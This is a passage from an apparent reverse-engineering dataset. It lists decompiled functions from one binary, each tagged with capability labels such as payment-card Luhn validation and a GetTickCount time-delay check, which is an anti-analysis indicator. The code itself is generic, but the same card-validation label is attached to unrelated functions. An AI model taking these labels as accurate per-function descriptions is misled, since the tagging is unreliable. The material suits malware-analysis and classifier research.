            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0003d870(int64_t arg1, ulong arg2, ulong arg3)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0003d690(arg2, arg3, *(arg1 + 0x678), *(arg1 + 0x670));\n    if (iVar1 == 0) {\n        iVar1 = 0;\n    }\n    else {\n        (*_fcn.00011638)(arg1 + 0x6b8, 0, 0);\n    }\n    return iVar1;\n}\n",
        "token_count": 124
    },
    "0003d8c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0003d8c0(int64_t arg1)\n\n{\n    uint uVar1;\n    \n    uVar1 = (**0x7b100)(*0x7b4d0, 0, 0, *(arg1 + 0x678), *(arg1 + 0x670), 0x14, 0x90000, 0, 0, 0x3d214, 0);\n    (*_fcn.00011638)(arg1 + 0x6e8, 0, 0);\n    return uVar1;\n}\n",
        "token_count": 128
    },
    "0003dec0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0003dec0(void)\n\n{\n    if (*0x7b610 != 0) {\n        fcn.00016dd4(*0x7b610);\n        (*_fcn.000115b0)(*0x7b610);\n    }\n    return;\n}\n",
        "token_count": 62
    },
    "0003e044": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.0003e044(ulong noname_0, ulong noname_1, int64_t *arg3)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    uint64_t uVar3;\n    \n    uVar3 = 0;\n    iVar1 = (**0x11128)(noname_0, noname_1, 0, 0, 0);\n    iVar2 = iVar1;\n    if (iVar1 != 0) {\n        (**0x11120)(iVar1, 0, 2);\n        iVar2 = (**0x11220)(iVar1, 0, 1, 0, uVar3 & 0xffffffff00000000, 0x10);\n        if (iVar2 == 0) {\n            (**0x11118)(iVar1);\n            (**0x11110)(iVar1);\n            iVar2 = 0;\n        }\n        else {\n            *arg3 = iVar1;\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 223
    },
    "0003e524": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.0003e524(void)\n\n{\n    uint32_t uVar1;\n    uint64_t uVar2;\n    \n    uVar2 = fcn.00016e44(0x156b8, 0x7b610);\n    if (uVar2 == 0) {\n        uVar1 = fcn.00016d54(*0x7b610, 0x3e4ac, 0);\n        uVar2 = uVar1;\n        if (uVar1 == 0) {\n            uVar2 = 0;\n        }\n        else {\n            (*_fcn.000115b0)(*0x7b610);\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 158
    },
    "0003e9f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0003e9f0(ulong *arg1, ulong arg2)\n\n{\n    char cVar1;\n    uint64_t uVar2;\n    uint64_t uVar3;\n    uint64_t uVar4;\n    char *pcVar5;\n    char acStack408 [111];\n    char acStack297 [265];\n    \n    fcn.000619f6(acStack297 + 1, 0x15770, 0x49);\n    fcn.00061b10(acStack408, 0x15758, arg2);\n    uVar4 = 0xffffffffffffffff;\n    uVar2 = uVar4;\n    pcVar5 = acStack408;\n    do {\n        if (uVar2 == 0) break;\n        uVar2 = uVar2 - 1;\n        cVar1 = *pcVar5;\n        pcVar5 = pcVar5 + 1;\n    } while (cVar1 != '\\0');\n    pcVar5 = acStack297;\n    uVar3 = uVar4;\n    do {\n        pcVar5 = pcVar5 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar5 != '\\0');\n    fcn.00061b10(acStack297 + ~uVar3, 0x15740, ~uVar2 - 1 & 0xffffffff);\n    pcVar5 = acStack297;\n    do {\n        pcVar5 = pcVar5 + 1;\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n    } while (*pcVar5 != '\\0');\n    fcn.00045e34(*arg1, arg1[1], acStack297 + 1, ~uVar4 - 1);\n    fcn.00045e34(*arg1, arg1[1], acStack408, ~uVar2 - 1);\n    return;\n}\n",
        "token_count": 438
    },
    "0003eed8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0003eed8(ulong arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    ulong uVar2;\n    ulong uStackX24;\n    uint64_t uStackX32;\n    \n    uVar2 = 0;\n    uStackX24 = 0;\n    iVar1 = fcn.0003e578(arg1, arg2, &uStackX24, &uStackX32);\n    if ((iVar1 != 0) && (7 < uStackX32)) {\n        uVar2 = 1;\n    }\n    fcn.0002fc50(uStackX24);\n    return uVar2;\n}\n",
        "token_count": 144
    },
    "0003f530": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0003f530(ulong arg1, uint64_t arg2, int64_t *arg3, uint64_t *arg4)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    ulong uVar3;\n    int64_t aiStackX8 [4];\n    \n    if (arg2 == 0) {\n        *arg3 = 0;\n        uVar3 = 0;\n        *arg4 = 0;\n    }\n    else {\n        iVar2 = fcn.0002fbc4(arg2);\n        *arg3 = iVar2;\n        if (iVar2 == 0) {\n            uVar3 = 0x21590004;\ncode_r0x0003f5c9:\n            fcn.0002fc50(*arg3);\n            *arg3 = 0;\n            *arg4 = 0;\n        }\n        else {\n            *arg4 = 0;\n            if (arg2 != 0) {\n                do {\n                    aiStackX8[0] = arg2 - *arg4;\n                    iVar1 = fcn.0003eab8(arg1, *arg4 + *arg3, aiStackX8[0], aiStackX8);\n                    if ((iVar1 == 0) || (aiStackX8[0] == 0)) {\n                        uVar3 = 0xffffffff;\n                        goto code_r0x0003f5c9;\n                    }\n                    *arg4 = *arg4 + aiStackX8[0];\n                } while (*arg4 < arg2);\n            }\n            uVar3 = 0;\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 361
    },
    "0003f5e4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.0003f5e4(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    char *pcVar4;\n    uchar auStackX8 [32];\n    \n    iVar2 = fcn.00026a28(0x2f1, 0x7b680, 0x52, 0x7b6d4);\n    if ((iVar2 != 0) || (iVar2 = fcn.00026a28(0x2f2, 0x7b620, 0x52, auStackX8),  iVar2 != 0)) {\n        return iVar2 + 0x191U | 0x21590000;\n    }\n    iVar3 = -1;\n    pcVar4 = 0x7b680;\n    do {\n        if (iVar3 == 0) break;\n        iVar3 = iVar3 + -1;\n        cVar1 = *pcVar4;\n        pcVar4 = pcVar4 + 1;\n    } while (cVar1 != '\\0');\n    *0x7b6d4 = ~iVar3 - 1;\n    return 0;\n}\n",
        "token_count": 264
    },
    "0003f664": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0003f664(uint32_t *arg1, uint64_t arg2)\n\n{\n    int32_t iVar1;\n    uint64_t uVar2;\n    bool bVar3;\n    \n    uVar2 = *0x7b6d4;\n    if ((*0x7b6d4 != 0) && (uVar2 + 0x11 < (arg2 & 0xffffffff))) {\n        bVar3 = *arg1 < *0x158b8;\n        if ((*arg1 == *0x158b8) && (bVar3 = *(arg1 + 1) < *0x158bc,  *(arg1 + 1) == *0x158bc)) {\n            iVar1 = 0;\n        }\n        else {\n            iVar1 = (1 - bVar3) - (bVar3 != 0);\n        }\n        if ((iVar1 == 0) && (iVar1 = fcn.00061a80(arg1 + 1, 0x7b680, uVar2, 1, 1),  iVar1 == 0)) {\n            return 1;\n        }\n        bVar3 = *arg1 < *0x158b0;\n        if ((*arg1 == *0x158b0) && (bVar3 = *(arg1 + 1) < *0x158b4,  *(arg1 + 1) == *0x158b4)) {\n            iVar1 = 0;\n        }\n        else {\n            iVar1 = (1 - bVar3) - (bVar3 != 0);\n        }\n        if ((iVar1 == 0) && (iVar1 = fcn.00061a80(arg1 + 5, 0x7b680, uVar2, 1, 1),  iVar1 == 0)) {\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 419
    },
    "0003fb10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0003fb10(void)\n\n{\n    *0x66200 = fcn.00026a7c(8, 0xdeadbeaf);\n    *0x78214 = fcn.00026a7c(9, 1);\n    return;\n}\n",
        "token_count": 62
    },
    "0003fb44": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0003fb44(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    int32_t iVar1;\n    ulong uVar2;\n    uint64_t arg2_00;\n    \n    arg2_00 = arg2;\n    if (arg3 == 0) {\n        iVar1 = fcn.0004009c(arg1, arg2_00);\n        if (iVar1 != 0) {\n            return 9;\n        }\n    }\n    else {\n        uVar2 = fcn.0003f9b8(arg1, arg2_00);\n        if (uVar2 != 0) {\n            return uVar2;\n        }\n        uVar2 = fcn.0003f9fc(arg1, arg2);\n        if (uVar2 != 0) {\n            return uVar2;\n        }\n        iVar1 = fcn.0003eed8(arg1, arg2_00);\n        if (iVar1 != 0) {\n            return 5;\n        }\n        iVar1 = fcn.0003f664(arg1, arg2_00);\n        if (iVar1 != 0) {\n            return 0xb;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 266
    },
    "0003fc74": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.0003fc74(ulong arg1, ulong arg2, int64_t arg3, ulong arg4)\n\n{\n    uint64_t uVar1;\n    uint64_t uVar2;\n    uint64_t uVar3;\n    int64_t iStack72;\n    \n    uVar2 = 0;\n    uVar3 = arg4;\n    if (arg4 != 0) {\n        do {\n            uVar1 = fcn.00045e80(arg1, arg2, uVar2 + arg3, uVar3 - uVar2);\n            if (uVar1 != 0) {\n                return uVar1;\n            }\n        } while ((iStack72 != 0) && (uVar2 = uVar2 + iStack72,  uVar2 < uVar3));\n    }\n    return -(uVar2 != uVar3);\n}\n",
        "token_count": 193
    },
    "000401c8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.000401c8(ulong arg1, int64_t arg2, int64_t arg3)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    uint64_t auStackX24 [2];\n    \n    while( true ) {\n        iVar1 = fcn.0003eab8(arg1, arg2, arg3 - 1U, auStackX24);\n        if (iVar1 == 0) {\n            return 0;\n        }\n        iVar2 = fcn.00061bb8(arg2, 10);\n        if (iVar2 != 0) break;\n        if (auStackX24[0] == arg3 - 1U) goto code_r0x00040240;\n        iVar1 = fcn.0003ec74(arg1);\n        if (iVar1 == 0) {\n            return 0;\n        }\n    }\n    auStackX24[0] = (iVar2 - arg2) + 1;\ncode_r0x00040240:\n    iVar1 = fcn.0003eab8(arg1, arg2, auStackX24[0], auStackX24);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    *(auStackX24[0] + arg2) = 0;\n    return 1;\n}\n",
        "token_count": 292
    },
    "00040e8c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00040e8c(ulong noname_0, int64_t *arg2)\n\n{\n    fcn.0002edfc(*arg2 + 0x68);\n    (**0x11110)(arg2[1]);\n    // WARNING: Could not recover jumptable at 0x00040eb3. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**0x11060)(*arg2);\n    return;\n}\n",
        "token_count": 102
    },
    "000412f8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.000412f8(int64_t arg1)\n\n{\n    ulong *puVar1;\n    ulong arg1_00;\n    ulong *puVar2;\n    \n    puVar1 = *(arg1 + 8);\n    if (puVar1 == NULL) {\n        arg1_00 = 0;\n    }\n    else {\n        if ((*(puVar1 + 10) & 5) == 0) {\n            arg1_00 = (**0x114a0)(puVar1, 0);\n        }\n        else {\n            arg1_00 = puVar1[3];\n        }\n        for (puVar2 = *puVar1; puVar2 != NULL; puVar2 = *puVar2) {\n        }\n    }\n    fcn.0002fc50(arg1_00);\n    (**0x11110)(puVar1);\n    // WARNING: Could not recover jumptable at 0x0004134d. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**0x11060)(arg1);\n    return;\n}\n",
        "token_count": 237
    },
    "00041354": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00041354(ulong arg1, uint32_t *arg2, ulong arg3)\n\n{\n    int64_t **ppiVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    ulong uVar5;\n    int64_t **arg1_00;\n    uint64_t uVar6;\n    uint64_t uVar7;\n    int64_t **ppiVar8;\n    char in_R9B;\n    bool bVar9;\n    \n    if ((*0x7b6e0 < 10000) && (arg1_00 = fcn.0002fbf0(0x38),  arg1_00 != NULL)) {\n        uVar7 = 0;\n        fcn.00061a56(arg1_00, 0);\n        *(arg1_00 + 2) = arg3;\n        *(arg1_00 + 0x14) = arg1;\n        if (arg2 != NULL) {\n            *(arg1_00 + 3) = *arg2;\n            *(arg1_00 + 0x1c) = *(arg2 + 1);\n        }\n        if (in_R9B == '\\0') {\n            *(arg1_00 + 0x24) = *(arg1_00 + 0x24) + 1;\n        }\n        else {\n            *(arg1_00 + 4) = *(arg1_00 + 4) + 1;\n        }\n        fcn.00030130(arg1_00 + 6);\n        uVar6 = (**0x113d0)();\n        if (*0x7b6e0 < 10000) {\n            ppiVar1 = *0x7b760;\n            if (*0x7b760 != NULL) {\n                do {\n                    while( true ) {\n                        ppiVar8 = ppiVar1;\n                        if ((*(ppiVar8 + 2) == arg3) && (*(ppiVar8 + 0x14) == arg1)) {\n                            if (in_R9B == '\\0') {\n                                *(ppiVar8 + 0x24) = *(ppiVar8 + 0x24) + 1;\n                            }\n                            else {\n                                *(ppiVar8 + 4) = *(ppiVar8 + 4) + 1;\n                            }\n                            if (arg2 != NULL) {\n                                uVar7 = 0x7b780;\n                                bVar9 = *(ppiVar8 + 3) < *0x7b780;\n                                if ((*(ppiVar8 + 3) == *0x7b780) &&\n                                   (bVar9 = *(ppiVar8 + 0x1c) < *0x7b784,  *(ppiVar8 + 0x1c) == *0x7b784)) {\n                                    iVar4 = 0;\n                                }\n                                else {\n                                    iVar4 = (1 - bVar9) - (bVar9 != 0);\n                                }\n                                if (iVar4 == 0) {\n                                    *(ppiVar8 + 3) = *arg2;\n                                    *(ppiVar8 + 0x1c) = *(arg2 + 1);\n                                }\n                                else {\n                                    bVar9 = *(ppiVar8 + 3) < *arg2;\n                                    if ((*(ppiVar8 + 3) == *arg2) &&\n                                       (bVar9 = *(ppiVar8 + 0x1c) < *(arg2 + 1),  *(ppiVar8 + 0x1c) == *(arg2 + 1))) {\n                                        iVar4 = 0;\n                                    }\n                                    else {\n                                        iVar4 = (1 - bVar9) - (bVar9 != 0);\n                                    }\n                                    if (iVar4 != 0) {\n                                        *(ppiVar8 + 5) = *(ppiVar8 + 5) + 1;\n                                    }\n                                }\n                            }\n                            fcn.00030130(ppiVar8 + 6);\n                            goto code_r0x000414cb;\n                        }\n                        uVar2 = fcn.0002fcf4(*(ppiVar8 + 2));\n                        uVar3 = fcn.0002fcf4(arg3);\n                        if (uVar3 < uVar2) break;\n                        ppiVar1 = ppiVar8[1];\n                        if (ppiVar8[1] == NULL) {\n                            ppiVar8[1] = arg1_00;\n                            goto code_r0x000414f9;\n                        }\n                    }\n                    ppiVar1 = *ppiVar8;\n                } while (*ppiVar8 != NULL);\n                *ppiVar8 = arg1_00;\ncode_r0x000414f9:\n                *0x7b6e0 = *0x7b6e0 + 1;\n                arg1_00 = *0x7b760;\n            }\n        }\n        else {\ncode_r0x000414cb:\n            fcn.0002fc50(arg1_00);\n            arg1_00 = *0x7b760;\n        }\n        *0x7b760 = arg1_00;\n        (**0x113c0)(0x7b768, uVar7 & 0xffffffffffffff00 | uVar6 & 0xff);\n        uVar5 = 1;\n    }\n    else {\n        uVar5 = 0;\n    }\n    return uVar5;\n}\n",
        "token_count": 1183
    },
    "00041504": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00041504(int64_t *arg1)\n\n{\n    if (*arg1 != 0) {\n        fcn.00041504(*arg1);\n    }\n    if (arg1[1] != 0) {\n        fcn.00041504(arg1[1]);\n    }\n    if ((arg1 != NULL) && (arg1 != 0x7a638)) {\n        fcn.0001c6d8(arg1, 0x7346744e);\n    }\n    return;\n}\n",
        "token_count": 114
    },
    "00041538": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.00041538(ulong arg1, ulong *arg2, ulong arg3)\n\n{\n    uint16_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint64_t uVar5;\n    uint64_t arg1_00;\n    ulong *puVar6;\n    ulong *puVar7;\n    bool bVar8;\n    \n    arg1_00 = arg2 & 0xffffffff;\n    uVar5 = (**0x113d0)();\n    puVar6 = *0x7b760;\n    do {\n        puVar7 = puVar6;\n        if (puVar6 == NULL) {\ncode_r0x000415d2:\n            uVar5 = (**0x113c0)(0x7b768, arg2 & 0xffffffffffffff00 | uVar5 & 0xff);\n            return uVar5 & 0xffffffffffffff00 | puVar7 != NULL;\n        }\n        if ((*(puVar6 + 2) == arg1_00) && (*(puVar6 + 0x14) == arg1)) {\n            uVar2 = *(puVar6 + 3);\n            arg2 = uVar2;\n            bVar8 = uVar2 < *0x7b780;\n            iVar4 = 0;\n            if (uVar2 == *0x7b780) {\n                uVar1 = *(puVar6 + 0x1c);\n                arg2 = uVar2 & 0xffff0000 | uVar1;\n                bVar8 = uVar1 < *0x7b784;\n                if (uVar1 != *0x7b784) goto code_r0x000415b3;\n            }\n            else {\ncode_r0x000415b3:\n                iVar4 = (1 - bVar8) - (bVar8 != 0);\n            }\n            puVar7 = NULL;\n            if (iVar4 != 0) {\n                arg2 = puVar6;\n                fcn.000619f6(arg3, puVar6, 0x38);\n                puVar7 = puVar6;\n            }\n            goto code_r0x000415d2;\n        }\n        uVar2 = fcn.0002fcf4(*(puVar6 + 2));\n        uVar3 = fcn.0002fcf4(arg1_00);\n        if (uVar3 < uVar2) {\n            puVar6 = *puVar6;\n        }\n        else {\n            puVar6 = puVar6[1];\n        }\n    } while( true );\n}\n",
        "token_count": 574
    },
    "000415f8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.000415f8(ulong *arg1, uint32_t *arg2, int64_t arg3)\n\n{\n    if (arg1 != NULL) {\n        do {\n            fcn.000415f8(*arg1, arg2, arg3);\n            if (arg3 != 0) {\n                fcn.000619f6(*arg2 * 0x38 + arg3, arg1, 0x38);\n            }\n            *arg2 = *arg2 + 1;\n            arg1 = arg1[1];\n        } while (arg1 != NULL);\n    }\n    return;\n}\n",
        "token_count": 135
    },
    "0004164c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0004164c(void)\n\n{\n    int64_t arg1;\n    int64_t *arg1_00;\n    uint8_t uVar1;\n    uint64_t uVar2;\n    \n    *0x87c90 = 1;\n    fcn.0002ee20(0x87c88);\n    uVar2 = 0;\n    fcn.00031648(0x7b770, 0);\n    fcn.00031624(0x7b770);\n    fcn.0002edfc(0x87c88);\n    uVar1 = (**0x113d0)(0x7b768);\n    arg1_00 = *0x7b760;\n    if (*0x7b760 != NULL) {\n        if (**0x7b760 != 0) {\n            fcn.00041504(**0x7b760);\n        }\n        arg1 = arg1_00[1];\n        if (arg1 != 0) {\n            fcn.00041504(arg1);\n        }\n        fcn.0002fc50(arg1_00);\n        *0x7b760 = NULL;\n    }\n    // WARNING: Could not recover jumptable at 0x000416e6. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**0x113c0)(0x7b768, uVar2 & 0xffffffffffffff00 | uVar1);\n    return;\n}\n",
        "token_count": 322
    },
    "000428e4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.000428e4(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int64_t iVar1;\n    int32_t iVar2;\n    uchar auStack72 [24];\n    \n    fcn.00031564(0x7b290, auStack72, 0);\n    iVar1 = fcn.00036bf8(arg1, 1);\n    if (iVar1 == 0) {\n        iVar2 = 0;\n    }\n    else {\n        iVar2 = *(iVar1 + 0xc);\n    }\n    fcn.00031598(0x7b290, auStack72, 0);\n    if (iVar1 != 0) {\n        if (iVar2 == 0) {\n            fcn.000426c8(arg1, arg2, arg3, arg4);\n        }\n        else {\n            fcn.00035288(arg1, arg2, arg3, arg4);\n        }\n    }\n    return;\n}\n",
        "token_count": 217
    },
    "00042d80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00042d80(void)\n\n{\n    ulong *puVar1;\n    ulong *puVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    int64_t iVar6;\n    \n    iVar6 = 5;\n    iVar4 = 0x7b7b0;\n    iVar5 = 5;\n    do {\n        fcn.0005ef7c(iVar4, 0);\n        iVar4 = iVar4 + 8;\n        iVar5 = iVar5 + -1;\n    } while (iVar5 != 0);\n    *0x7b7a0 = 1;\n    fcn.0002ee20(0x7b790);\n    fcn.00031648(0x7b808, 0);\n    fcn.00031624(0x7b808);\n    iVar4 = 0x7b820;\n    do {\n        iVar3 = fcn.0002eec4(iVar4);\n        if (iVar3 != 0) {\n            fcn.00031648(iVar4, 0);\n            fcn.00031624(iVar4);\n        }\n        iVar4 = iVar4 + 0x10;\n        iVar6 = iVar6 + -1;\n        puVar2 = *0x7b7f8;\n    } while (iVar6 != 0);\n    while (puVar1 = *0x7b7d8,  puVar2 != NULL) {\n        puVar1 = *puVar2;\n        fcn.0002fc50(puVar2);\n        puVar2 = puVar1;\n    }\n    while (puVar1 != NULL) {\n        puVar2 = *puVar1;\n        fcn.0002fc50(puVar1);\n        puVar1 = puVar2;\n    }\n    if (*0x7b790 != 0) {\n        fcn.0002fc50(*0x7b790);\n        *0x7b790 = 0;\n    }\n    return;\n}\n",
        "token_count": 449
    },
    "00042fe4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nuint64_t fcn.00042fe4(int64_t arg1, ulong arg2)\n\n{\n    ulong *puVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    ulong *puVar4;\n    ulong *puVar5;\n    uint8_t uVar6;\n    uint32_t uVar7;\n    ulong *puVar8;\n    uint64_t uVar9;\n    ulong *puVar10;\n    ulong *puVar11;\n    int64_t iVar12;\n    \n    uVar6 = (**0x113d0)(0x7b798);\n    iVar3 = *0xfffff78000000320;\n    uVar7 = (**0x112f0)();\n    puVar11 = NULL;\n    uVar9 = SUB168(SEXT816(0x346dc5d63886594b) * SEXT816(uVar7 * iVar3) >> 0x40, 0);\n    puVar8 = puVar11;\n    puVar4 = *0x7b7d8;\n    iVar12 = *0x7b7e0;\n    iVar2 = *0x7b7e0;\n    puVar10 = *0x7b800;\n    while (*0x7b7e0 = iVar12,  puVar4 != NULL) {\n        if ((uVar7 * iVar3) / 10000 - *(puVar4 + 0x3c) < 0xea61) {\n            puVar8 = puVar4;\n            puVar4 = *puVar4;\n            iVar12 = *0x7b7e0;\n        }\n        else {\n            puVar1 = *puVar4;\n            iVar12 = *0x7b7e0 + ((-0x58 - *(puVar4 + 6)) - *(puVar4 + 4));\n            puVar5 = puVar1;\n            *0x7b7e0 = iVar2;\n            if (puVar8 != NULL) {\n                *puVar8 = puVar1;\n                puVar5 = *0x7b7d8;\n            }\n            *0x7b7d8 = puVar5;\n            if (puVar1 == NULL) {\n                puVar10 = puVar8;\n            }\n            *0x7b800 = puVar10;\n            fcn.0002fc50(puVar4);\n            puVar4 = puVar1;\n            iVar2 = *0x7b7e0;\n        }\n    }\n    (**0x113c0)(0x7b798, uVar9 & 0xffffffffffffff00 | uVar6);\n    puVar8 = fcn.0002fbf0(*(arg1 + 0x30) + 0x58 + *(arg1 + 0x20));\n    if (puVar8 == NULL) {\n        uVar9 = 0;\n    }\n    else {\n        fcn.000619f6(puVar8, arg1, 0x58);\n        puVar4 = puVar8 + 0xb;\n        puVar8[3] = puVar4;\n        puVar8[5] = *(puVar8 + 4) + puVar4;\n        fcn.000619f6(puVar4, *(arg1 + 0x18), *(arg1 + 0x20));\n        fcn.000619f6(puVar8[5], *(arg1 + 0x28), *(arg1 + 0x30));\n        iVar2 = *0xfffff78000000320;\n        uVar7 = (**0x112f0)();\n        *puVar8 = 0;\n        *(puVar8 + 0x3c) = (uVar7 * iVar2) / 10000;\n        uVar6 = (**0x113d0)();\n        uVar9 = *(arg1 + 0x20) + 0x58 + *(arg1 + 0x30) + *0x7b7e0;\n        if (uVar9 < 0x20001) {\n            puVar4 = puVar8;\n            if (*0x7b7d8 != NULL) {\n                **0x7b800 = puVar8;\n                puVar4 = *0x7b7d8;\n            }\n            *0x7b7d8 = puVar4;\n            puVar11 = 0x1;\n            *0x7b7e0 = *(puVar8 + 4) + *0x7b7e0 + 0x58 + *(puVar8 + 6);\n            *0x7b800 = puVar8;\n        }\n        uVar9 = (**0x113c0)(0x7b798, uVar9 & 0xffffffffffffff00 | uVar6);\n        uVar9 = uVar9 & 0xffffffffffffff00 | puVar11;\n    }\n    return uVar9;\n}\n",
        "token_count": 1079
    },
    "00044988": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00044988(ulong arg1)\n\n{\n    int64_t iVar1;\n    int32_t aiStackX16 [2];\n    uchar auStackX24 [16];\n    \n    fcn.00031564(0x7b290, auStackX24, 0);\n    iVar1 = fcn.00036bf8(arg1, 1);\n    if (iVar1 == 0) {\n        fcn.00031598(0x7b290, auStackX24, 0);\n    }\n    else {\n        fcn.00031598(0x7b290, auStackX24, 0);\n        fcn.00044878(*(iVar1 + 0x450));\n        *(iVar1 + 0x470) = 0;\n        (**0x11038)(aiStackX16, *(iVar1 + 0x450));\n        if (aiStackX16[0] == 0x103) {\n            fcn.0002ee4c(iVar1 + 0x460, 0xffffffff);\n        }\n        fcn.0002edfc(iVar1 + 0x460);\n        fcn.000367a0(arg1);\n    }\n    return;\n}\n",
        "token_count": 266
    },
    "00044a80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00044a80(ulong arg1, ulong arg2, ulong arg3, int32_t *arg4)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    int32_t iStack264;\n    int32_t iStack260;\n    uchar auStack256 [8];\n    uchar auStack248 [32];\n    int32_t iStack216;\n    int32_t iStack208;\n    int32_t *piStack200;\n    int32_t iStack72;\n    uchar auStack64 [16];\n    \n    iVar3 = 0;\n    fcn.00031564(0x7b290, auStack256, 0);\n    iVar2 = fcn.00036bf8(arg1, 1);\n    if (iVar2 != 0) {\n        if (((arg2 == 1) && (arg3 == 0x1010e)) && (*(iVar2 + 0x47c) != 0)) {\n            iStack260 = *arg4;\n            arg4 = &iStack260;\n            if (iStack260 != 0) {\n                iStack260 = 1;\n            }\n        }\n        iVar3 = *(iVar2 + 0x450);\n    }\n    fcn.00031598(0x7b290, auStack256, 0);\n    if (iVar3 == 0) {\n        iStack264 = -0x3ffffddb;\n    }\n    else {\n        iVar1 = fcn.0002ed80(auStack64);\n        if (iVar1 == 0) {\n            iStack264 = -0x3fffffff;\n        }\n        else {\n            iStack216 = arg2;\n            iStack208 = arg3;\n            piStack200 = arg4;\n            fcn.00061c2a(&iStack264, iVar3, auStack248);\n            if (iStack264 == 0x103) {\n                fcn.0002ee4c(auStack64, 0xffffffff);\n                fcn.0002edfc(auStack64);\n                iStack264 = iStack72;\n            }\n        }\n    }\n    return iStack264;\n}\n",
        "token_count": 476
    },
    "00044fdc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
